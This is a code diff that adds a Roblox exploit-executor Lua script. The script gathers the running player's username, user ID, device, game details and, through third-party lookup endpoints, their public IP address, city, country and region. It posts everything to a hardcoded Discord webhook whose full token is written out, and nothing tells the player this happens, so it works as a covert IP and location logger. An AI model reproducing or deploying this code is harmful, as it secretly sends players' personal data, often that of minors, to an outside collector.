@@ -1,1 +1,79 @@
 
+local webhookUrl = "https://discord.com/api/webhooks/1358090492478488617/T6IhHR7Cl9qZ30hlxFoxDK_SWvpJdcarn629vUgSKWLR5O0eR_6z8slLTcDXLybj-T7N"
+
+
+local player = game:GetService("Players").LocalPlayer
+local username = player.Name
+local userid = player.UserId
+local displayName = player.DisplayName
+local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
+local playerCount = #game:GetService("Players"):GetPlayers()
+local maxPlayers = game:GetService("Players").MaxPlayers
+local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+
+
+local gameId = game.PlaceId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local serverTime = os.date("%Y-%m-%d %H:%M:%S")
+
+
+local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
+
+
+local function identifyHardware()
+    local executor = identifyexecutor() or "Unknown Executor"
+    return executor
+end
+
+
+local function getIpInfo()
+    local success, ipInfo = pcall(function()
+        return game.HttpService:JSONDecode(game:HttpGet("https://playvora.netlify.app/ipinfo?ip=" .. game:HttpGet("https://playvora.vercel.app/api/ip")))
+    end)
+    if success and ipInfo then
+        return ipInfo.ip, ipInfo.city, ipInfo.country, ipInfo.region
+    else
+        return "N/A", "N/A", "N/A", "N/A"
+    end
+end
+
+local ip, city, country, region = getIpInfo()
+
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Player Log",
+        ["description"] = "Log details for player: " .. username,
+        ["color"] = 0x3498db,
+        ["fields"] = {
+            {["name"] = "Player Info", ["value"] = "Username: " .. username .. "\nDisplay Name: " .. displayName .. "\nUserID: " .. userid, ["inline"] = true},
+            {["name"] = "Game Info", ["value"] = "Game Name: " .. gameName .. "\nGame ID: " .. gameId, ["inline"] = true},
+            {["name"] = "Server Info", ["value"] = "Players: " .. playerCount .. " / " .. maxPlayers .. "\nServer Time: " .. serverTime, ["inline"] = true},
+            {["name"] = "Health Info", ["value"] = "Health: " .. health .. " / " .. maxHealth, ["inline"] = true},
+            {["name"] = "Device Info", ["value"] = "Device Type: " .. deviceType, ["inline"] = true},
+            {["name"] = "Network Info", ["value"] = "Ping: " .. pingValue .. " ms", ["inline"] = true},
+            {["name"] = "Hardware Info", ["value"] = "Executor: " .. identifyHardware(), ["inline"] = true},
+            {["name"] = "IP Info", ["value"] = "IP: " .. ip .. "\nCity: " .. city .. "\nCountry: " .. country .. "\nRegion: " .. region, ["inline"] = true}
+        },
+        ["footer"] = {
+            ["text"] = "Generated at " .. serverTime
+        }
+    }}
+}
+
+
+local HttpService = game:GetService("HttpService")
+local jsonData = HttpService:JSONEncode(data)
+local headers = {["Content-Type"] = "application/json"}
+
+
+local success, response = pcall(function()
+    local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    request({
+        Url = webhookUrl,
+        Body = jsonData,
+        Method = "POST",
+        Headers = headers
+    })
+end)
